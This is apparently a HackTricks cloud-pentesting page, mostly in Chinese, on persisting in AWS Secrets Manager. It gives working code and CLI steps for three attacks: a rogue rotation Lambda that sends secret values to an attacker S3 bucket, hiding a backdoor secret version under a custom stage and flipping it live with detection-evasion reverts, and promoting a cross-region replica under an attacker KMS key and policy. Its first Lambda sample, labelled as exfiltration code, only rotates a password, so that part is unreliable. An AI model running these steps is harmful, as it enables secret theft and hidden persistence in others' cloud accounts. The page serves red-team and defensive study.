# AWS - Secrets Manager Persistence

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

更多信息请查看：

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Via Resource Policies

可以通过资源策略将对 **secrets** 的访问权限授予外部账户。请查看 [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) 以获取更多信息。注意，要 **access a secret**，外部账户还需要 **access to the KMS key encrypting the secret**。

### Via Secrets Rotate Lambda

为了自动 **rotate secrets**，会调用已配置的 **Lambda**。如果攻击者能够 **change** **code**，就可以直接 **exfiltrate the new secret** 给自己。

下面是用于此类操作的 Lambda 代码示例：
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
{{#include ../../../../banners/hacktricks-training.md}}





### 通过 RotateSecret 将 rotation Lambda 替换为攻击者控制的函数

滥用 `secretsmanager:RotateSecret` 将 secret 重新绑定到攻击者控制的 rotation Lambda 并触发立即 rotation。恶意函数在 rotation 步骤（createSecret/setSecret/testSecret/finishSecret）期间将 secret 版本（AWSCURRENT/AWSPENDING）外传到攻击者接收端（例如 S3 或外部 HTTP）。

- 要求
- 权限: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` 在攻击者 Lambda 上, `iam:CreateRole/PassRole/PutRolePolicy` (或 AttachRolePolicy) 用于为 Lambda 执行角色配置 `secretsmanager:GetSecretValue`，最好还包括 `secretsmanager:PutSecretValue`、`secretsmanager:UpdateSecretVersionStage`（以便 rotation 继续工作），KMS `kms:Decrypt`（用于 secret 的 KMS key），以及用于外传的 `s3:PutObject`（或出站流量）。
- 一个启用了 rotation 的目标 secret id (`SecretId`) 或者能够启用 rotation 的权限。

- 影响
- 攻击者在不修改合法 rotation 代码的情况下获取 secret 值。仅更改 rotation 配置以指向攻击者的 Lambda。如果未被注意，后续按计划的 rotations 也会继续调用攻击者的函数。

- 攻击步骤 (CLI)
1) 准备攻击者接收端和 Lambda 角色
- 创建用于外传的 S3 bucket 和一个受 Lambda 信任的执行角色，该角色具有读取 secret 和写入 S3 的权限（以及根据需要的日志/KMS 权限）。
2) 部署攻击者 Lambda，在每个 rotation 步骤中获取 secret 值并写入 S3。最小化的 rotation 逻辑可以只是将 AWSCURRENT 复制到 AWSPENDING，并在 finishSecret 中提升它以保持服务正常。
3) 重新绑定 rotation 并触发
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) 通过列出该 secret 的 S3 前缀并检查 JSON 工件来验证外传。
5) （可选）恢复原始 rotation Lambda 以降低被检测的风险。

- 示例攻击者 Lambda（Python）将数据外传到 S3
- 环境变量: `EXFIL_BUCKET=<bucket>`
- 处理程序: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Version Stage Hijacking 用于 隐蔽持久性（自定义 stage + 快速 AWSCURRENT 切换）

滥用 Secrets Manager 的版本分阶段标签来植入由攻击者控制的 secret 版本，并将其隐藏在自定义阶段（例如 `ATTACKER`）下，同时生产继续使用原始的 `AWSCURRENT`。在任意时刻，将 `AWSCURRENT` 切换到攻击者的版本以污染依赖的工作负载，然后恢复以最小化检测。这样可以在不更改 secret 名称或轮换配置（rotation config）的情况下，提供隐蔽的后门持久化和快速的使用时操控。

- 要求
- 权限: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (用于校验)
- 目标 secret id 在目标 Region。

- 影响
- 保持一个隐藏的、由攻击者控制的 secret 版本，并在需要时原子性地将 `AWSCURRENT` 切换到该版本，影响任何解析相同 secret 名称的使用者。快速切换并迅速恢复能够降低被检测的概率，同时实现基于时间的妥协。

- 攻击步骤 (CLI)
- 准备
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>CLI commands</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- 注意
- 当你提供 `--client-request-token` 时，Secrets Manager 会将其用作 `VersionId`。如果在添加新版本时没有显式设置 `--version-stages`，默认会将 `AWSCURRENT` 移到新版本，并将先前的版本标记为 `AWSPREVIOUS`。


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

滥用 Secrets Manager 的多区域复制，将目标 secret 复制到监控较少的 Region，在该 Region 使用攻击者控制的 KMS 密钥对其加密，然后将该副本提升为独立 secret 并附加一个宽松的 resource policy，授予攻击者读取权限。原始主 Region 的 secret 保持不变，通过被提升的副本可以持久且隐蔽地访问 secret 值，同时绕过主 Region 上的 KMS/策略限制。

- 要求
- Permissions: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- 在副本 Region：`kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant`（或 `kms:PutKeyPolicy`），以允许攻击者主体执行 `kms:Decrypt`。
- 一个攻击者主体（用户/角色），用于接收对被提升 secret 的读取访问。

- 影响
- 通过位于攻击者控制下的 KMS CMK 和宽松资源策略下的独立副本，获得对 secret 值的持久跨区域访问路径。原始主 Region 的 secret 未被触及。

- 攻击（CLI）
- 变量
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) 在副本区域创建由攻击者控制的 KMS 密钥
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) 将 secret 复制到 R2，使用 attacker KMS key
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) 在 R2 中将副本提升为独立实例
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) 在 R2 的 standalone secret 上附加 permissive resource policy
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) 从 R2 的 attacker principal 读取 secret
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```

